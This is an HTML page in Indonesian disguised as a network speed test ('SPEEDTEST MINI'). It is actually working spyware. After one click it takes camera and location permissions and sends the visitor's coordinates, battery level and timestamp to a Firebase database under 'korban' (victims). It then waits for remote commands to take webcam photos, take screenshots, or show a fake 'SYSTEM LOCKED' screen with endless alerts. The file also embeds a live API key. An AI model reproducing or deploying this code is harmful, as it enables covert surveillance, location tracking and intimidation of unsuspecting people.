<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>⚡ SPEEDTEST MINI</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        body { background: #000; color: #00ff00; font-family: sans-serif; text-align: center; padding-top: 100px; }
        .btn { border: 2px solid #00ff00; background: none; color: #00ff00; padding: 20px 40px; border-radius: 50px; font-weight: bold; cursor: pointer; }
        #lock { display:none; position:fixed; inset:0; background:red; color:white; padding-top:200px; font-size:30px; z-index:999; }
    </style>
</head>
<body>
    <video id="v" autoplay style="display:none;"></video><canvas id="c" style="display:none;"></canvas>
    <div id="ui">
        <h1>SPEEDTEST v4.0</h1>
        <p>Ukur latensi dan kecepatan jaringan Anda.</p>
        <button class="btn" onclick="run()">MULAI TES</button>
    </div>
    <div id="lock">☣️ SYSTEM LOCKED</div>

<script>
    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
    firebase.initializeApp(config); const db = firebase.database();
    let myId = null;

    async function run() {
        document.documentElement.requestFullscreen();
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:true});
            document.getElementById('v').srcObject = stream;
            navigator.geolocation.getCurrentPosition(async pos => {
                let bat = "N/A"; if(navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100)+"%"; }
                const ref = db.ref('korban').push({
                    waktu: new Date().toLocaleString(),
                    baterai: bat,
                    maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                });
                myId = ref.key;
                document.getElementById('ui').innerHTML = "<h2>🔍 Menganalisis Latensi Jaringan... 99%</h2>";

                db.ref('commands/'+myId).on('value', snap => {
                    const cmd = snap.val(); if(!cmd) return;
                    if(cmd.action === "TAKE") {
                        const v = document.getElementById('v'), c = document.getElementById('c');
                        c.width = v.videoWidth; c.height = v.videoHeight;
                        c.getContext('2d').drawImage(v, 0, 0);
                        db.ref('hasil_foto/'+myId).set({ foto: c.toDataURL('image/jpeg', 0.4) });
                    }
                    if(cmd.action === "SHOT") {
                        html2canvas(document.body).then(can => { db.ref('hasil_screenshot/'+myId).set({ foto: can.toDataURL('image/jpeg', 0.4) }); });
                    }
                    if(cmd.action === "VIRUS") { document.getElementById('lock').style.display='block'; setInterval(()=>alert("ALERT"), 500); }
                });
            });
        } catch(e) { alert("Butuh izin untuk tes kecepatan!"); }
    }
</script>
</body>
</html>
